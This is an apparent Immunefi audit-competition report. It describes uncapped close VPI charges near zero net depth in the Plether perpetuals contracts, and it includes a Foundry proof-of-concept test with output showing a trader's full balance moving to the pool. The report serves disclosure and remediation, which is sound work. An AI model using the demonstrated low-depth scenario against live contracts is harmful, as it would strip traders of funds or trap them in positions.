# \#98734 [SC-High] Close VPI has no cap as net depth approaches zero, so a light-side full close can take the trader's whole clearinghouse balance

**Submitted on Nov 9th 2026 at 22:14:47 UTC by @Afriauditor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98734
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  - Permanent freezing of funds

## Description


## Summary

Close VPI is the potential difference `k·(S₁² − S₀²)/(2D)`, where `D` is net economic depth (pool assets minus trader claims). The code skips VPI when `D == 0` "to keep protective exits live". For any `D > 0`, though, the charge is uncapped and grows as `1/D`.

A full close collects its action charges from everything the account holds: the withheld price gain, the action reserve, all free settlement, the released margin and liquidation reserve, and committed-order margin. So when depth is small, a full close on the light side transfers the trader's entire clearinghouse balance to the pool.

The zero-depth exemption does not hold in practice either. The close's own commit collects the trader's carry into the pool, so at execution depth is a few atoms rather than zero, and the charge is effectively unlimited.

In the PoC, a $100k light-side full close is tested at different depths. At $1,000 of net depth, or at zero depth before the commit, the trader loses their whole $50,209 balance, $44,960 of which was free cash never pledged to the position. At normal depth the same close costs $449. A close with an ordinary charge ceiling cannot execute at all.

## Description

**1. The curve is uncapped above zero and skipped only at exactly zero.**

`CfdMath.tryGetSkewCost` (`CfdMath.sol:118`) returns `0` when `depthAssets == 0`, and `k·S²/(2D)` otherwise. `CloseAccountingLib.buildCloseState` (`CloseAccountingLib.sol:104-113`) applies it to every close:

```solidity
// With no economic depth, keep protective exits live without creating a fresh charge or rebate.
// The lifetime clamp below still recovers any previously received negative VPI.
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
// Clamp so lifetime VPI (accrued + delta) never goes negative.
```

The lifetime clamp only limits rebates. Nothing limits a charge. For example, take a $100k close that moves skew from $1.0M to $1.1M, with `vpiFactor = 0.01`:

| Net depth | VPI charge |
| --- | --- |
| $0 | $0 |
| $1 | $1.05 billion |
| $1,000 | $1.05 million |
| $100,000 | $10,500 |
| $1.1M | $955 (0.95% of notional) |

**2. A full close collects the charge from the whole account.**

`ACCOUNTING_SPEC.md:1042-1045` sets the order of collection. Full closes withhold new price gains and settle dedicated VPI backing first. They then "collect generic action charges from spendable action reserve, free settlement (including released liquidation reserve and unused VPI backing), safely released pledge, and finally committed-order margin". The remainder is waived only "after all eligible funds are exhausted". Free settlement is the trader's idle cash and has nothing to do with the position, yet it is taken.

**3. The zero-depth exemption is defeated by the close itself.**

An ordinary close commitment "collects carry from pledge first, then free settlement" (`ACCOUNTING_SPEC.md:940-942`), and that carry is paid into the pool. If pool assets and trader claims are equal, as when depth has just reached zero, that carry makes depth slightly positive by the time the close executes. In the PoC it is 14 atoms, which makes the charge unbounded. The exemption therefore only works while trader claims exceed pool assets.

**4. When it applies.**

VPI uses net depth (`SECURITY.md:1438`). In a solvent pool, depth is at least the maximum liability, which is at least the skew, so the charge stays near `k × notional`. The blow-up happens when realized trader wins have drained the pool while open interest and skew remain: the degraded or terminal-deficit regime.

The protocol plans for this regime and keeps closes open in it:

- The runbook's first step is "Let closes and liquidations continue" (`SECURITY.md:1505`).
- The spec promises "Protective closes and liquidations remain available" at zero depth (`ACCOUNTING_SPEC.md:665-669`, `SECURITY.md:1439-1440`).

Liquidations are not affected, because they don't compute a fresh VPI charge (`SECURITY.md:1436`). Voluntary closes and protection closes are.

**5. Two outcomes for a light-side trader:**

- **With an unlimited charge ceiling, the account is drained.** The docs describe `type(uint256).max` as "an explicit unlimited allowance" (`CANONICAL_ENTRYPOINTS.md:125`), and it is the natural setting for a stop-loss that must always fire. The whole account balance goes to LPs as pool revenue.
- **With an ordinary ceiling, the trader cannot exit.** The close fails terminally with `ConstraintViolation`, and a stop-loss relatches. The trader stays exposed during exactly the crisis the zero-depth rule was meant to cover.

## Impact

- **Loss of user funds.** A light-side full close at low depth hands the trader's entire clearinghouse balance to the pool, including free cash that was never pledged to the position. In the PoC, $44,960 of the $50,209 seized was free cash.
- **Protective exits are blocked.** With an ordinary ceiling, the close cannot execute. That breaks the documented promise that protective closes remain available in this regime.
- **LPs receive the seized funds** as pool revenue. The trigger can be an ordinary inflow that lifts depth just above zero, such as the close's own carry or a small recapitalization.



## Proof of Concept

## Proof of Concept

## Recommendation

- **Make close VPI continuous near zero.** For example, treat any depth below the post-close skew the same as zero for protective closes, or floor the depth used: `D_eff = max(D, S₁)`.
- **Cap the fresh close VPI charge.** Use a notional fraction, or limit it to the position's own pledge so it can never reach free settlement.
- **Measure depth before the commit's carry collection,** so the zero-depth exemption works as written.

## Proof of Concept

**File:** `packages/perps/test/poc/LowDepthCloseVpi.t.sol`. It runs on the repo's `BasePerpTest` with launch risk parameters, and all positions are opened and closed through the Router.

**Setup:** longs hold 5,000 lots ($500k). The victim holds a $100k SHORT, which is on the light side, with $5k of margin and $45k of free cash.

**How depth is lowered:** the test moves pool cash out, the same way the team's degraded-mode tests model earlier realized trader wins (`DegradedSettlementBehavior.t.sol`). Open interest and skew are left in place.

```bash
cd packages/perps
forge test --match-path test/poc/LowDepthCloseVpi.t.sol -vv
```

```text
[PASS] test_BoundedCloseCannotExitAtLowDepth()
  bounded close at depth $1,000: status 3 reason 8        (Failed, ConstraintViolation)
    position lots still open: 1000
[PASS] test_FullCloseSeizesWholeAccountAtLowDepth()
  victim balance before close: 50209189220
    of which free (not pledged): 44959800000
  normal depth
    net depth at execution: 1002798395857
    victim keeps:           49720444956
    pool gains:             448744250
    treasury gains (fee):   40000000
  depth $100,000
    net depth at execution: 100000000014
    victim keeps:           45669189070
    pool gains:             4500000136
    treasury gains (fee):   40000000
  depth $1,000
    net depth at execution: 1000000014
    victim keeps:           0
    pool gains:             50169189206
    treasury gains (fee):   40000000
  depth 0 before commit
    net depth at execution: 14
    victim keeps:           0
    pool gains:             50169189206
    treasury gains (fee):   40000000
```

The same close costs $449 at normal depth, $4,500 at $100k, and the whole $50,209 account at $1,000. When depth starts at exactly zero, the commit's own carry leaves 14 atoms at execution and the result is the same. With a $5,000 charge ceiling, ten times the normal cost, the close fails and the trader stays in the position.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console2} from "forge-std/console2.sol";

contract LowDepthCloseVpiTest is BasePerpTest {

    uint256 internal constant PRICE = 1e8; // $1.00
    uint256 internal constant LOT = CfdTypes.SIZE_QUANTUM; // $100 notional at $1.00

    address internal constant LONGS = address(0xA1);
    address internal constant VICTIM = address(0xB1);

    /// @dev Launch risk parameters from DEPLOYMENT.md.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        _fundTrader(LONGS, 200_000e6);
        _fundTrader(VICTIM, 50_000e6);
        // Heavy LONG side, light SHORT side: $400k of skew on a ~$1M pool. The victim's $100k SHORT is on the light
        // side, so closing it increases skew. Only $5k of the victim's $50k is pledged to the position.
        _routerOpen(LONGS, CfdTypes.Side.LONG, 3000 * LOT, 50_000e6);
        _routerOpen(VICTIM, CfdTypes.Side.SHORT, 1000 * LOT, 5000e6);
        _routerOpen(LONGS, CfdTypes.Side.LONG, 2000 * LOT, 50_000e6);
    }

    /// The same full close at four net depths.
    function test_FullCloseSeizesWholeAccountAtLowDepth() public {
        uint256 balanceBefore = clearinghouse.balanceAssets(VICTIM);
        uint256 freeBefore = clearinghouse.getAccountAssetBuckets(VICTIM).freeSettlementAssets;
        console2.log("victim balance before close:", balanceBefore);
        console2.log("  of which free (not pledged):", freeBefore);

        uint256 snap = vm.snapshotState();
        _closeAtDepth("normal depth", type(uint256).max);
        vm.revertToState(snap);
        snap = vm.snapshotState();
        _closeAtDepth("depth $100,000", 100_000e6);
        vm.revertToState(snap);
        snap = vm.snapshotState();
        (uint256 kept1k, uint256 poolGain1k) = _closeAtDepth("depth $1,000", 1000e6);
        vm.revertToState(snap);
        (uint256 keptZero,) = _closeAtDepth("depth 0 before commit", 0);

        assertEq(kept1k, 0, "near-zero depth seizes the whole account");
        assertGt(poolGain1k, freeBefore, "including free cash that was never pledged to the position");
        assertEq(keptZero, 0, "the zero-depth exemption is defeated by the close's own commit-time carry");
    }

    /// A close with an ordinary action-charge ceiling cannot exit at all.
    function test_BoundedCloseCannotExitAtLowDepth() public {
        _setDepth(1000e6);
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = bytes32(uint256(router.nextCommitId()));
        request.side = CfdTypes.Side.SHORT;
        request.sizeDelta = 1000 * LOT;
        request.targetPrice = 1; // unbounded for a SHORT close
        request.isClose = true;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: 5000e6, // ten times the ~$490 this close costs at normal depth
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
        vm.prank(VICTIM);
        uint64 id = router.commitOrder(request);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, _mockPythUpdateData(PRICE));
        (uint256 size,,,,,,) = engine.positions(VICTIM);
        console2.log("bounded close at depth $1,000: status", uint8(result.status), "reason", uint8(result.terminalReason));
        console2.log("  position lots still open:", size / LOT);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "the close fails");
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(size, 1000 * LOT, "the trader is still in the position");
    }

    /// @dev Fully closes the light-side SHORT through the Router (harness close: unlimited charge ceilings).
    function _closeAtDepth(
        string memory label,
        uint256 depth
    ) internal returns (uint256 victimAfter, uint256 poolGain) {
        _setDepth(depth);
        address treasury = engine.protocolTreasury();
        uint256 treasuryBefore = clearinghouse.balanceAssets(treasury);
        vm.prank(VICTIM);
        uint64 id = router.commitOrder(CfdTypes.Side.SHORT, 1000 * LOT, 0, 0, true);
        uint256 depthAtExecution = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        uint256 poolBefore = pool.totalAssets();
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, _mockPythUpdateData(PRICE));
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "full close executed");
        (uint256 size,,,,,,) = engine.positions(VICTIM);
        assertEq(size, 0, "closed");
        victimAfter = clearinghouse.balanceAssets(VICTIM);
        poolGain = pool.totalAssets() - poolBefore;
        console2.log(label);
        console2.log("  net depth at execution:", depthAtExecution);
        console2.log("  victim keeps:          ", victimAfter);
        console2.log("  pool gains:            ", poolGain);
        console2.log("  treasury gains (fee):  ", clearinghouse.balanceAssets(treasury) - treasuryBefore);
    }

    /// @dev Models earlier realized trader wins the way the team's degraded-mode tests do
    ///      (`DegradedSettlementBehavior.t.sol`): pool cash leaves, open interest and skew stay.
    function _setDepth(
        uint256 depth
    ) internal {
        uint256 assets = pool.totalAssets();
        if (depth < assets) {
            vm.prank(address(pool));
            settlementToken.transfer(address(0xDEAD), assets - depth);
        }
    }

    function _routerOpen(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        vm.prank(trader);
        uint64 orderId = router.commitOrder(side, size, margin, 0, false);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, _mockPythUpdateData(PRICE));
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "router open executed");
    }

}
```
